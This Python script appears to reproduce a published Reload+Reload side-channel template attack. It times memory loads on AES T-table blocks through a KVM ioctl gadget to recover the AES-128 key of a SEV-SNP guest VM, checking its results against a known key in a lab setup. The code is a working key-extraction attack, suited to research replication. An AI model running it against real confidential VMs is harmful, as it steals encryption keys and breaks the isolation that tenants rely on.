#!/usr/bin/env python3
"""
Reload+Reload §7.1 RRMB-based AES-128 key recovery.

Strictly follows the paper's two-phase template attack:

Profile phase (§7.1.2 Step 1–2):
  For each T-table t (0–3):
    - Construct access-m plaintexts:  last-round lookup for table t hits block 0
    - Construct not-access-m plaintexts: lookup misses block 0
    - For each plaintext: trigger AES encryption, concurrently run RR gadget,
      count d-range-bounded loads → integer count per encryption
    - Fit Gaussian(μ,σ²) to each count distribution
    - Scan all [lo,hi) d-ranges, pick the one maximising SNR

Attack phase (§7.1.2 Attack Phase):
  For each random plaintext:
    - Trigger encryption, count d-range-bounded loads
    - For each key guess k: predict access-m via (ct_i ⊕ k) ∈ SBOX_FIRST16
    - Accumulate log-likelihood against the two Gaussians
  → Best k per byte position → invert round-10 subkey → master key
"""
from __future__ import annotations

import argparse
import csv
import json
import math
import os
import time
from dataclasses import dataclass, field
from pathlib import Path

from ch5_common import collect_host_facts, timestamped_outdir_ch5, write_json, write_lines
from experiment_common import chown_to_sudo_user, ensure_artifacts, print_banner, require_root, stop_proc
from run_53 import (
    KVM_AMD_READ_GPA_MODE_CIPHERTEXT_NOCACHE,
    KVM_AMD_READ_GPA_MODE_CIPHERTEXT_CACHEABLE,
    NptCtlClient,
    TRUE_AES_KEY,
    aes_request_async_finish,
    aes_request_async_poll,
    aes_request_async_start,
    ioctl_read_gpa_tsc_batch,
    launch_victim_vm,
    load_scan_range,
    maybe_sync_oracle_from_range_json,
    npt_discovery,
    parse_u64,
    select_target_page,
    wait_nptctl_ready,
    wait_vm_ready,
)

# ── AES constants ──────────────────────────────────────────────────────────────

PAGE_SZ    = 4096
LINE_SZ    = 64
TABLE_BYTES = 1024   # each T-table is 256 * 4 bytes = 1024 bytes
TABLE_COUNT = 4

SBOX = bytes([
    0x63,0x7C,0x77,0x7B,0xF2,0x6B,0x6F,0xC5,0x30,0x01,0x67,0x2B,0xFE,0xD7,0xAB,0x76,
    0xCA,0x82,0xC9,0x7D,0xFA,0x59,0x47,0xF0,0xAD,0xD4,0xA2,0xAF,0x9C,0xA4,0x72,0xC0,
    0xB7,0xFD,0x93,0x26,0x36,0x3F,0xF7,0xCC,0x34,0xA5,0xE5,0xF1,0x71,0xD8,0x31,0x15,
    0x04,0xC7,0x23,0xC3,0x18,0x96,0x05,0x9A,0x07,0x12,0x80,0xE2,0xEB,0x27,0xB2,0x75,
    0x09,0x83,0x2C,0x1A,0x1B,0x6E,0x5A,0xA0,0x52,0x3B,0xD6,0xB3,0x29,0xE3,0x2F,0x84,
    0x53,0xD1,0x00,0xED,0x20,0xFC,0xB1,0x5B,0x6A,0xCB,0xBE,0x39,0x4A,0x4C,0x58,0xCF,
    0xD0,0xEF,0xAA,0xFB,0x43,0x4D,0x33,0x85,0x45,0xF9,0x02,0x7F,0x50,0x3C,0x9F,0xA8,
    0x51,0xA3,0x40,0x8F,0x92,0x9D,0x38,0xF5,0xBC,0xB6,0xDA,0x21,0x10,0xFF,0xF3,0xD2,
    0xCD,0x0C,0x13,0xEC,0x5F,0x97,0x44,0x17,0xC4,0xA7,0x7E,0x3D,0x64,0x5D,0x19,0x73,
    0x60,0x81,0x4F,0xDC,0x22,0x2A,0x90,0x88,0x46,0xEE,0xB8,0x14,0xDE,0x5E,0x0B,0xDB,
    0xE0,0x32,0x3A,0x0A,0x49,0x06,0x24,0x5C,0xC2,0xD3,0xAC,0x62,0x91,0x95,0xE4,0x79,
    0xE7,0xC8,0x37,0x6D,0x8D,0xD5,0x4E,0xA9,0x6C,0x56,0xF4,0xEA,0x65,0x7A,0xAE,0x08,
    0xBA,0x78,0x25,0x2E,0x1C,0xA6,0xB4,0xC6,0xE8,0xDD,0x74,0x1F,0x4B,0xBD,0x8B,0x8A,
    0x70,0x3E,0xB5,0x66,0x48,0x03,0xF6,0x0E,0x61,0x35,0x57,0xB9,0x86,0xC1,0x1D,0x9E,
    0xE1,0xF8,0x98,0x11,0x69,0xD9,0x8E,0x94,0x9B,0x1E,0x87,0xE9,0xCE,0x55,0x28,0xDF,
    0x8C,0xA1,0x89,0x0D,0xBF,0xE6,0x42,0x68,0x41,0x99,0x2D,0x0F,0xB0,0x54,0xBB,0x16,
])
# The first 16 elements of the S-box (indices 0–15) define "block 0 access"
SBOX_FIRST16: set[int] = set(SBOX[:16])

RCON = [0x00,0x01,0x02,0x04,0x08,0x10,0x20,0x40,0x80,0x1B,0x36]


# ── AES key schedule helpers ───────────────────────────────────────────────────

def _rot_word(w: int) -> int:
    return ((w << 8) & 0xFFFFFFFF) | ((w >> 24) & 0xFF)

def _sub_word(w: int) -> int:
    return (
        (SBOX[(w >> 24) & 0xFF] << 24)
        | (SBOX[(w >> 16) & 0xFF] << 16)
        | (SBOX[(w >>  8) & 0xFF] <<  8)
        |  SBOX[ w        & 0xFF]
    )

def _bytes_to_words(b: bytes) -> list[int]:
    return [int.from_bytes(b[i:i+4], "big") for i in range(0, len(b), 4)]

def _words_to_bytes(ws: list[int]) -> bytes:
    return b"".join((w & 0xFFFFFFFF).to_bytes(4, "big") for w in ws)

def aes128_round10_subkey(master_key: bytes) -> bytes:
    w = _bytes_to_words(master_key)
    for i in range(4, 44):
        temp = w[i-1]
        if i % 4 == 0:
            temp = _sub_word(_rot_word(temp)) ^ (RCON[i // 4] << 24)
        w.append((w[i-4] ^ temp) & 0xFFFFFFFF)
    return _words_to_bytes(w[40:44])

def aes128_master_from_round10(rk10: bytes) -> bytes:
    w = [0] * 44
    rk = _bytes_to_words(rk10)
    w[40], w[41], w[42], w[43] = rk
    for i in range(43, 3, -1):
        if i % 4 == 0:
            temp = _sub_word(_rot_word(w[i-1])) ^ (RCON[i // 4] << 24)
        else:
            temp = w[i-1]
        w[i-4] = (w[i] ^ temp) & 0xFFFFFFFF
    return _words_to_bytes(w[:4])


# ── Paper §7.1 helpers ─────────────────────────────────────────────────────────

def table_for_last_round_byte(byte_pos: int) -> int:
    """Paper eq: j = ((i mod 4) + 2) mod 4  (Table accessed in last round)."""
    return ((byte_pos % 4) + 2) % 4


def monitored_block_gpa(te0_gpa: int, table_idx: int) -> int:
    """
    The first memory block (64B) of T-table[table_idx].
    Paper §7.1.1: 'We monitor the encryption of a series of plaintexts.
    We check if it accesses the first memory block (64B, consisting of 16
    4B elements) in a given T-table array.'
    """
    block_start = te0_gpa + table_idx * TABLE_BYTES
    return block_start & ~(LINE_SZ - 1)  # 64B-aligned


def is_access_m(ct_byte: int, key_guess: int) -> bool:
    """
    Paper §7.1.1: last-round operation c_i = k_i ⊕ T[s_i].
    s_i = ct_i ⊕ k_i.  Access block 0 iff s_i ∈ {0..15},
    i.e. SBOX[s_i] is in the first 16 S-box values? No —
    actually s_i is the *state byte* index into the T-table.
    Block 0 = first 16 * 4B = indices 0..15 of the table.
    So access-m iff (ct_i ⊕ k_i) ∈ {0..15}.
    """
    return (ct_byte ^ key_guess) < 16


def labels_access_m(samples: list["Sample"], byte_pos: int, round10_key: bytes) -> list[bool]:
    """Ground-truth labels using the known round-10 subkey."""
    k = round10_key[byte_pos]
    return [is_access_m(s.ct[byte_pos], k) for s in samples]


# ── Gaussian PDF ───────────────────────────────────────────────────────────────

def gaussian_logpdf(x: float, mu: float, var: float) -> float:
    v = max(1e-9, var)
    return -0.5 * (math.log(2.0 * math.pi * v) + (x - mu) ** 2 / v)


@dataclass
class GaussianTemplate:
    mu_m:  float   # mean count for access-m
    var_m: float   # variance for access-m
    mu_nm: float   # mean count for not-access-m
    var_nm: float  # variance for not-access-m
    d_lo:  int
    d_hi:  int
    snr:   float

    def logpdf_m(self, count: float) -> float:
        return gaussian_logpdf(count, self.mu_m, self.var_m)

    def logpdf_nm(self, count: float) -> float:
        return gaussian_logpdf(count, self.mu_nm, self.var_nm)

    def classify(self, count: float) -> bool:
        """Return True if access-m is more likely."""
        return self.logpdf_m(count) >= self.logpdf_nm(count)


# ── d-range counting (paper §7.1.2 / §6.3.2) ──────────────────────────────────

def drange_count(latencies: list[int], d_lo: int, d_hi: int) -> int:
    """Count loads with latency in [d_lo, d_hi)."""
    return sum(1 for x in latencies if d_lo <= x < d_hi)


def find_best_drange_from_raw(
    lats_m:  list[list[int]],   # raw latency lists for access-m samples
    lats_nm: list[list[int]],   # raw latency lists for not-access-m samples
    step: int = 8,
) -> tuple[int, int, float]:
    """
    Paper §7.1.2: scan [lo, UB) ranges, pick highest SNR.
    UB = max observed latency + step.
    """
    all_lats: list[int] = []
    for ll in lats_m:
        all_lats.extend(ll)
    for ll in lats_nm:
        all_lats.extend(ll)
    if not all_lats:
        return 0, step, 0.0

    UB = (max(all_lats) // step + 2) * step
    best_lo, best_hi, best_snr = 0, UB, 0.0

    def _snr(cm: list[int], cnm: list[int]) -> float:
        if len(cm) < 2 or len(cnm) < 2:
            return 0.0
        mu_m   = sum(cm)  / len(cm)
        mu_nm  = sum(cnm) / len(cnm)
        var_m  = sum((x - mu_m)  ** 2 for x in cm)  / len(cm)
        var_nm = sum((x - mu_nm) ** 2 for x in cnm) / len(cnm)
        return abs(mu_m - mu_nm) / math.sqrt(max(1e-12, var_m + var_nm))

    hi = UB
    for lo in range(0, UB, step):
        cm  = [drange_count(ll, lo, hi) for ll in lats_m]
        cnm = [drange_count(ll, lo, hi) for ll in lats_nm]
        s = _snr(cm, cnm)
        if s > best_snr:
            best_snr = s
            best_lo, best_hi = lo, hi

    return best_lo, best_hi, best_snr


def build_gaussian_template(
    lats_m:  list[list[int]],
    lats_nm: list[list[int]],
    d_lo: int,
    d_hi: int,
    snr: float,
) -> GaussianTemplate:
    counts_m  = [drange_count(ll, d_lo, d_hi) for ll in lats_m]
    counts_nm = [drange_count(ll, d_lo, d_hi) for ll in lats_nm]

    def _stats(xs: list[int]) -> tuple[float, float]:
        if not xs:
            return 0.0, 1.0
        mu  = sum(xs) / len(xs)
        var = sum((x - mu) ** 2 for x in xs) / max(1, len(xs))
        return mu, max(1e-6, var)

    mu_m,  var_m  = _stats(counts_m)
    mu_nm, var_nm = _stats(counts_nm)
    return GaussianTemplate(
        mu_m=mu_m, var_m=var_m,
        mu_nm=mu_nm, var_nm=var_nm,
        d_lo=d_lo, d_hi=d_hi, snr=snr,
    )


# ── Sample dataclass ──────────────────────────────────────────────────────────

@dataclass
class Sample:
    pt:   bytes
    ct:   bytes
    lats: list[int] = field(default_factory=list)   # raw TSC latencies


# ── RR gadget: collect one sample ─────────────────────────────────────────────

def collect_one_sample(
    vm_ctl: NptCtlClient,
    monitor_gpa: int,
    host: str,
    aes_port: int,
    pt: bytes,
    batch_size: int,
    sock_timeout_s: float,
    probe_window_us: float,
    max_probes: int,
) -> Sample | None:
    """
    Paper §7.1.2 Attack Phase Step 1:
      'We trigger a SEV-SNP VM to encrypt the plaintext.
       During the encryption, we execute the RR gadget in KVM
       and count the number of d-range-bounded loads.'

    The RR gadget (Listing 1):
      timestamp_0 = get_timestamp()
      load(addr)
      timestamp_1 = get_timestamp()
      latency = timestamp_1 - timestamp_0

    We use the batch ioctl to collect many such measurements per encryption.
    All measurements are in CACHEABLE mode so each load goes to DRAM.
    """
    lats: list[int] = []
    try:
        req = aes_request_async_start(host, aes_port, pt, timeout_s=sock_timeout_s)
        start_ns = int(req["start_ns"])
        deadline_ns   = start_ns + int(sock_timeout_s * 1e9)
        window_end_ns = start_ns + int(probe_window_us * 1e3)

        probe_count = 0
        while True:
            now_ns = time.perf_counter_ns()
            done   = aes_request_async_poll(req)

            ts = ioctl_read_gpa_tsc_batch(
                vm_ctl, monitor_gpa,
                mode=KVM_AMD_READ_GPA_MODE_CIPHERTEXT_CACHEABLE,
                nr_samples=batch_size,
                flags=0,
            )
            lats.extend(int(x) for x in ts)
            probe_count += 1

            if done or now_ns >= window_end_ns or now_ns >= deadline_ns or probe_count >= max_probes:
                break

        ct = aes_request_async_finish(req)
    except Exception:
        return None

    if len(ct) != 16 or not lats:
        return None
    return Sample(pt=pt, ct=ct, lats=lats)


# ── Profile phase ─────────────────────────────────────────────────────────────

def table_accesses_block0(ct: bytes, round10_key: bytes, table_idx: int) -> bool:
    """
    Returns True if ANY byte position that uses table_idx accesses block 0.
    Block 0 = first 16 entries of the T-table (indices 0..15).
    A byte position i uses table j = ((i%4)+2)%4.
    Access block 0 iff s_i = ct_i ⊕ k_i < 16.
    We OR across all byte positions sharing the same table.
    """
    for i in range(16):
        if table_for_last_round_byte(i) == table_idx:
            if is_access_m(ct[i], round10_key[i]):
                return True
    return False


def profile_table(
    vm_ctl: NptCtlClient,
    args: argparse.Namespace,
    monitor_gpa: int,
    table_idx: int,
    true_round10: bytes,
    n_profile: int,
    out_csv: Path,
) -> tuple[list[list[int]], list[list[int]]]:
    """
    Paper §7.1.2 Profile Phase Step 1:
      Collect N_profile access-m and N_profile not-access-m encryptions.

    access-m: ANY byte position sharing table_idx has s_i < 16
              (i.e., accesses the first memory block of the T-table)
    not-access-m: NO such byte position accesses block 0
    """

    lats_m:  list[list[int]] = []   # access-m raw latencies
    lats_nm: list[list[int]] = []   # not-access-m raw latencies

    out_csv.parent.mkdir(parents=True, exist_ok=True)
    with out_csv.open("w", newline="") as fp:
        wr = csv.writer(fp)
        wr.writerow(["sample_id", "label", "pt_hex", "ct_hex", "n_lats",
                     "lat_min", "lat_p50", "lat_max"])

        attempts = 0
        while (len(lats_m) < n_profile or len(lats_nm) < n_profile) and attempts < n_profile * 10:
            attempts += 1
            pt = os.urandom(16)

            s = collect_one_sample(
                vm_ctl, monitor_gpa,
                host=args.host, aes_port=args.aes_port,
                pt=pt,
                batch_size=int(args.batch_size),
                sock_timeout_s=float(args.sock_timeout_s),
                probe_window_us=float(args.probe_window_us),
                max_probes=int(args.max_probes),
            )
            if s is None:
                continue

            # Determine label using known key (OR across all bytes sharing this table)
            acc = table_accesses_block0(s.ct, true_round10, table_idx)
            if acc and len(lats_m) < n_profile:
                lats_m.append(s.lats)
                label = 1
            elif not acc and len(lats_nm) < n_profile:
                lats_nm.append(s.lats)
                label = 0
            else:
                continue

            sl = sorted(s.lats)
            row_id = len(lats_m) + len(lats_nm) - 1
            wr.writerow([row_id, label, s.pt.hex(), s.ct.hex(),
                         len(sl), sl[0], sl[len(sl)//2], sl[-1]])

        print(f"  [profile t={table_idx}] access-m={len(lats_m)}  "
              f"not-access-m={len(lats_nm)}  attempts={attempts}")
    return lats_m, lats_nm


# ── Attack phase ──────────────────────────────────────────────────────────────

def collect_attack_samples(
    vm_ctl: NptCtlClient,
    args: argparse.Namespace,
    monitor_gpa: int,
    table_idx: int,
    n_attack: int,
    out_csv: Path,
) -> list[Sample]:
    """Collect N_attack samples with random plaintexts (key unknown)."""
    samples: list[Sample] = []
    out_csv.parent.mkdir(parents=True, exist_ok=True)
    with out_csv.open("w", newline="") as fp:
        wr = csv.writer(fp)
        wr.writerow(["sample_id", "pt_hex", "ct_hex", "n_lats",
                     "lat_min", "lat_p50", "lat_max"])
        attempts = 0
        while len(samples) < n_attack and attempts < n_attack * 4:
            attempts += 1
            pt = os.urandom(16)
            s = collect_one_sample(
                vm_ctl, monitor_gpa,
                host=args.host, aes_port=args.aes_port,
                pt=pt,
                batch_size=int(args.batch_size),
                sock_timeout_s=float(args.sock_timeout_s),
                probe_window_us=float(args.probe_window_us),
                max_probes=int(args.max_probes),
            )
            if s is None:
                continue
            sid = len(samples)
            samples.append(s)
            sl = sorted(s.lats)
            wr.writerow([sid, s.pt.hex(), s.ct.hex(),
                         len(sl), sl[0], sl[len(sl)//2], sl[-1]])
        print(f"  [attack  t={table_idx}] collected={len(samples)}  attempts={attempts}")
    return samples


# ── Key recovery ──────────────────────────────────────────────────────────────

def recover_byte(
    samples: list[Sample],
    byte_pos: int,
    tpl: GaussianTemplate,
) -> dict:
    """
    Paper §7.1.2 Attack Phase Step 2:
      For each key guess k (0..255):
        For each encryption:
          - count d-range-bounded loads
          - predict access-m: (ct_i ⊕ k) < 16
          - accumulate log-likelihood from the matching Gaussian
      Best k = argmax total log-likelihood.
    """
    scores: list[tuple[float, int]] = []
    for k in range(256):
        ll = 0.0
        for s in samples:
            count = drange_count(s.lats, tpl.d_lo, tpl.d_hi)
            if is_access_m(s.ct[byte_pos], k):
                ll += tpl.logpdf_m(count)
            else:
                ll += tpl.logpdf_nm(count)
        scores.append((ll, k))
    scores.sort(reverse=True)
    best_ll, best_k = scores[0]
    second_ll = scores[1][0] if len(scores) > 1 else best_ll
    return {
        "byte_pos":     byte_pos,
        "best_key":     best_k,
        "score_margin": best_ll - second_ll,
        "top5":         [{"k": k, "ll": ll} for ll, k in scores[:5]],
        "all_scores":   [{"k": k, "ll": ll} for ll, k in scores],
    }


# ── CLI ───────────────────────────────────────────────────────────────────────

def build_parser() -> argparse.ArgumentParser:
    ap = argparse.ArgumentParser(
        description="Reload+Reload §7.1 RRMB AES-128 template attack"
    )
    # VM / infrastructure
    ap.add_argument("--outdir",                  default="")
    ap.add_argument("--skip-build",              action="store_true")
    ap.add_argument("--suspected-range-json",    default="")
    ap.add_argument("--scan-start-gpa",          default="")
    ap.add_argument("--scan-end-gpa",            default="")
    ap.add_argument("--te0-inpage-offset",       default="")
    ap.add_argument("--force-te-page-gpa",       default="")
    ap.add_argument("--force-te0-gpa",           default="")
    ap.add_argument("--discover-rounds",         type=int,   default=8)
    ap.add_argument("--trigger-requests-per-round", type=int, default=8)
    ap.add_argument("--baseline-wait-ms",        type=int,   default=2)
    ap.add_argument("--confirm-pages",           type=int,   default=8)
    ap.add_argument("--confirm-line-reps",       type=int,   default=8)
    ap.add_argument("--host",                    default="127.0.0.1")
    ap.add_argument("--aes-port",                type=int,   default=9000)
    ap.add_argument("--rsa-port",                type=int,   default=9001)
    ap.add_argument("--vm-ready-timeout-s",      type=int,   default=180)
    ap.add_argument("--guest-extra-cmdline",     default="")
    ap.add_argument("--qemu-cpu",                type=int,   default=32)
    ap.add_argument("--cpu-model",               default="host,pmu=on")
    ap.add_argument("--smp",                     type=int,   default=1)
    ap.add_argument("--mem",                     default="4G")
    ap.add_argument("--sock-timeout-s",          type=float, default=3.0)
    ap.add_argument("--true-key-hex",            default=TRUE_AES_KEY.hex())
    # RR gadget parameters
    ap.add_argument("--batch-size",              type=int,   default=64,
                    help="Loads per batch ioctl call (RR gadget iterations per probe)")
    ap.add_argument("--probe-window-us",         type=float, default=5000.0,
                    help="How long to keep probing per encryption (µs)")
    ap.add_argument("--max-probes",              type=int,   default=50000,
                    help="Max probe loop iterations per encryption")
    ap.add_argument("--drange-step",             type=int,   default=8,
                    help="Step size (cycles) when scanning d-range candidates")
    # Profile / attack counts (paper: N_profile=1000, N_attack=200000 for cache-disabled)
    ap.add_argument("--n-profile",               type=int,   default=1000,
                    help="Profile samples per class per T-table (paper: 1000)")
    ap.add_argument("--n-attack",                type=int,   default=200000,
                    help="Attack samples per T-table (paper: 200000)")
    return ap


# ── Main ──────────────────────────────────────────────────────────────────────

def main() -> None:
    ap = build_parser()
    args = ap.parse_args()
    require_root("run_53_rrmb.py must be run as root (sudo -E)")

    try:
        true_key = bytes.fromhex(args.true_key_hex.strip())
    except Exception as e:
        raise SystemExit(f"[arg] invalid --true-key-hex: {e}")
    if len(true_key) != 16:
        raise SystemExit("[arg] --true-key-hex must be 16 bytes (32 hex chars)")
    true_round10 = aes128_round10_subkey(true_key)

    outdir = Path(args.outdir) if args.outdir else timestamped_outdir_ch5("exp5_3_rrmb")
    outdir.mkdir(parents=True, exist_ok=True)
    print_banner("Experiment 5.3 RRMB (Reload+Reload §7.1)", outdir)

    maybe_sync_oracle_from_range_json(args)
    ensure_artifacts(bool(args.skip_build), outdir / "build_stage")
    collect_host_facts(outdir)

    scan_start_gpa, scan_end_gpa, te0_inpage_offset = load_scan_range(args)

    vm_dir = outdir / "vm"
    proc = vm_ctl = None
    try:
        proc, npt_sock = launch_victim_vm(args, vm_dir)
        if not wait_nptctl_ready(npt_sock, timeout_s=args.vm_ready_timeout_s):
            raise SystemExit(f"[vm] nptctl not ready: {npt_sock}")
        if not wait_vm_ready(args.host, args.aes_port, timeout_s=args.vm_ready_timeout_s):
            raise SystemExit("[vm] AES service not ready")

        vm_ctl = NptCtlClient(npt_sock, timeout_s=2.0)
        vm_ctl.connect()
        vm_ctl.ping()

        # ── Locate T-table GPA ─────────────────────────────────────────────
        target_forced = False
        if args.force_te0_gpa:
            te0_gpa    = parse_u64(args.force_te0_gpa)
            te_page_gpa = te0_gpa & ~(PAGE_SZ - 1)
            target_forced = True
        elif args.force_te_page_gpa:
            te_page_gpa = parse_u64(args.force_te_page_gpa) & ~(PAGE_SZ - 1)
            te0_gpa     = te_page_gpa + te0_inpage_offset
            target_forced = True
        else:
            ranking  = npt_discovery(vm_ctl, args, scan_start_gpa, scan_end_gpa, outdir)
            if not ranking:
                raise SystemExit("[discover] empty NPT discovery result")
            selected    = select_target_page(vm_ctl, ranking, args, outdir,
                                             te0_inpage_offset=te0_inpage_offset)
            te_page_gpa = int(selected["te_page_gpa"])
            te0_gpa     = int(selected["te0_gpa"])

        disc_dir = outdir / "discovery"
        disc_dir.mkdir(parents=True, exist_ok=True)
        write_json(disc_dir / "target.json", {
            "te_page_gpa":      f"0x{te_page_gpa:x}",
            "te0_gpa":          f"0x{te0_gpa:x}",
            "te0_inpage_offset":f"0x{te0_inpage_offset:x}",
            "forced":           target_forced,
        })
        print(f"[target] te0_gpa=0x{te0_gpa:x}  te_page_gpa=0x{te_page_gpa:x}")

        # ── Profile phase ──────────────────────────────────────────────────
        print("\n=== Profile Phase ===")
        profile_dir = outdir / "profile"
        profile_dir.mkdir(exist_ok=True)

        # Per-table templates
        templates: dict[int, GaussianTemplate] = {}
        for t in range(TABLE_COUNT):
            monitor_gpa = monitored_block_gpa(te0_gpa, t)
            print(f"\n[profile] table={t}  monitor_gpa=0x{monitor_gpa:x}")

            lats_m, lats_nm = profile_table(
                vm_ctl, args,
                monitor_gpa=monitor_gpa,
                table_idx=t,
                true_round10=true_round10,
                n_profile=int(args.n_profile),
                out_csv=profile_dir / f"profile_t{t}.csv",
            )

            if not lats_m or not lats_nm:
                print(f"  [warn] table {t}: insufficient profile data")
                templates[t] = GaussianTemplate(0,1,0,1,0,1,0.0)
                continue

            # Find optimal d-range (paper §7.1.2 Step 2)
            d_lo, d_hi, snr = find_best_drange_from_raw(
                lats_m, lats_nm, step=int(args.drange_step)
            )
            tpl = build_gaussian_template(lats_m, lats_nm, d_lo, d_hi, snr)
            templates[t] = tpl

            print(f"  d-range=[{d_lo},{d_hi})  SNR={snr:.3f}")
            print(f"  access-m:     μ={tpl.mu_m:.2f}  σ²={tpl.var_m:.2f}")
            print(f"  not-access-m: μ={tpl.mu_nm:.2f}  σ²={tpl.var_nm:.2f}")

            # Save template
            write_json(profile_dir / f"template_t{t}.json", {
                "table_idx": t,
                "monitor_gpa": f"0x{monitor_gpa:x}",
                "d_lo": d_lo, "d_hi": d_hi, "snr": snr,
                "mu_m": tpl.mu_m, "var_m": tpl.var_m,
                "mu_nm": tpl.mu_nm, "var_nm": tpl.var_nm,
                "n_access_m": len(lats_m), "n_not_access_m": len(lats_nm),
            })

        # ── Attack phase ───────────────────────────────────────────────────
        print("\n=== Attack Phase ===")
        attack_dir = outdir / "attack"
        attack_dir.mkdir(exist_ok=True)

        # Collect attack samples per table
        attack_samples: dict[int, list[Sample]] = {}
        for t in range(TABLE_COUNT):
            monitor_gpa = monitored_block_gpa(te0_gpa, t)
            print(f"\n[attack] table={t}  monitor_gpa=0x{monitor_gpa:x}")
            attack_samples[t] = collect_attack_samples(
                vm_ctl, args,
                monitor_gpa=monitor_gpa,
                table_idx=t,
                n_attack=int(args.n_attack),
                out_csv=attack_dir / f"attack_t{t}.csv",
            )

        # Key recovery per byte
        print("\n=== Key Recovery ===")
        key_recovery_dir = outdir / "key_recovery"
        key_recovery_dir.mkdir(exist_ok=True)

        recovered_round10 = bytearray(16)
        per_byte: list[dict] = []

        for byte_pos in range(16):
            t   = table_for_last_round_byte(byte_pos)
            tpl = templates[t]
            smp = attack_samples[t]

            rec = recover_byte(smp, byte_pos, tpl)
            recovered_round10[byte_pos] = rec["best_key"]
            per_byte.append(rec)

            correct = (rec["best_key"] == true_round10[byte_pos])
            print(f"  byte {byte_pos:2d}: recovered=0x{rec['best_key']:02x}  "
                  f"true=0x{true_round10[byte_pos]:02x}  "
                  f"margin={rec['score_margin']:.1f}  "
                  f"{'OK' if correct else 'WRONG'}")

            # Save per-byte score CSV (all 256 candidates, ranked)
            with (key_recovery_dir / f"scores_b{byte_pos:02d}.csv").open("w", newline="") as fp:
                wr = csv.writer(fp)
                wr.writerow(["rank", "k", "log_likelihood"])
                for rank, entry in enumerate(rec["all_scores"], start=1):
                    wr.writerow([rank, entry["k"], f"{entry['ll']:.6f}"])

        recovered_round10 = bytes(recovered_round10)
        recovered_master  = aes128_master_from_round10(recovered_round10)

        byte_correct_r10  = sum(1 for i in range(16) if recovered_round10[i] == true_round10[i])
        byte_correct_mast = sum(1 for i in range(16) if recovered_master[i]  == true_key[i])

        summary = {
            "recovered_round10_subkey": recovered_round10.hex(),
            "true_round10_subkey":      true_round10.hex(),
            "round10_byte_accuracy":    byte_correct_r10 / 16.0,
            "round10_full_success":     recovered_round10 == true_round10,
            "recovered_master_key":     recovered_master.hex(),
            "true_master_key":          true_key.hex(),
            "master_byte_accuracy":     byte_correct_mast / 16.0,
            "master_full_success":      recovered_master == true_key,
            "n_profile": int(args.n_profile),
            "n_attack":  int(args.n_attack),
            "per_byte":  per_byte,
        }
        write_json(key_recovery_dir / "summary.json", summary)

        write_lines(outdir / "stats_53_rrmb.txt", [
            "=== 5.3 RRMB (Reload+Reload §7.1) ===",
            f"te0_gpa=0x{te0_gpa:x}",
            f"te_page_gpa=0x{te_page_gpa:x}",
            f"n_profile={args.n_profile}",
            f"n_attack={args.n_attack}",
            f"batch_size={args.batch_size}",
            f"probe_window_us={args.probe_window_us}",
            f"drange_step={args.drange_step}",
            "",
            f"recovered_round10={recovered_round10.hex()}",
            f"true_round10     ={true_round10.hex()}",
            f"round10_byte_accuracy={byte_correct_r10}/16 = {byte_correct_r10/16:.2%}",
            f"round10_full_success={recovered_round10 == true_round10}",
            "",
            f"recovered_master={recovered_master.hex()}",
            f"true_master     ={true_key.hex()}",
            f"master_byte_accuracy={byte_correct_mast}/16 = {byte_correct_mast/16:.2%}",
            f"master_full_success={recovered_master == true_key}",
        ])

        print(f"\n=== DONE ===")
        print(f"Round-10 subkey accuracy: {byte_correct_r10}/16 bytes")
        print(f"Master key accuracy:      {byte_correct_mast}/16 bytes")
        print(f"Full success: {recovered_master == true_key}")
        print(f"Output: {outdir}")

    finally:
        if vm_ctl is not None:
            vm_ctl.close()
        if proc is not None:
            stop_proc(proc, timeout_s=3.0)
        chown_to_sudo_user(outdir)


if __name__ == "__main__":
    main()
